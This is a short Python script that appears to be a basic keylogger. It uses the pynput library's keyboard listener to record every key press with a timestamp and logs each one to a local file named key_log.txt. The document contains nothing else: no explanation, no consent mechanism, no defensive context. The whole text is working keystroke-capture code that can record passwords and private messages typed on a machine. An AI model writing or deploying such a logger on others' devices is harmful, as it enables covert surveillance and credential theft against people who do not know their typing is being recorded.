from pynput.keyboard import Key, Listener
import logging

stringlog_dir = ""

logging.basicConfig(filename= (stringlog_dir + "key_log.txt"), level= (logging.DEBUG), format= '%(asctime)s:%(message)s:')

def on_press(key):
    logging.info(str(key))
    
with Listener(on_press = on_press) as listener:
    listener.join()